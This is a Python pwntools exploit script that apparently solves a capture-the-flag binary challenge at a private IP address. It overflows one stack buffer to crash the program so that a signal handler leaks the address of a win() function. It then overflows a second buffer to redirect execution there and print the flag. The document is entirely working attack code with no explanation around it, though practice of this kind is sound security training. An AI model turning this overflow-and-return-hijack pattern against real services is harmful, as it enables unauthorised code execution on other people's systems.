#!/usr/bin/env python3
from pwn import *
import re

# target (change to remote host/port or keep for local testing with socat/netcat relay)
host = "10.213.0.102"
port = 51563

# connect
p = remote(host, port)

# Offsets for this x86_64 binary
off1 = 40   # 32-byte buffer + 8 saved rbp
off2 = 136  # 128-byte buffer + 8 saved rbp

# Stage 1: overflow first buffer and set return to 0 -> SIGSEGV -> sig_handler leaks win()
payload1 = b"A" * off1 + p64(0)
# wait for prompt and send
p.recvuntil(b"Say magic words: ")
p.sendline(payload1)

# Read until "Now make a wish:" and capture the leak line
data = b""
try:
    data = p.recvuntil(b"Now make a wish:", timeout=3)
except EOFError:
    # fall back to reading what we have
    data += p.recv(timeout=1)

# parse leaked win address from data like: "[+] This is your gift: 0x5555555546a0"
m = re.search(br"This is your gift:\s*(0x[0-9a-fA-F]+)", data)
if not m:
    print("Leak not found. Program output:")
    print(data.decode(errors='ignore'))
    p.close()
    exit(1)

win_leak = int(m.group(1), 16)
log.success(f"Leaked win address: {hex(win_leak)}")

# Stage 2: overflow make_a_wish's buffer to overwrite return address with win()
payload2 = b"B" * off2 + p64(win_leak)
# The binary printed "Now make a wish: " which we consumed with recvuntil, so now send the second payload
p.sendline(payload2)

# Receive final output (flag or message)
try:
    out = p.recvall(timeout=3)
except EOFError:
    out = p.recv(timeout=1)

print(out.decode(errors='ignore'))

p.close()
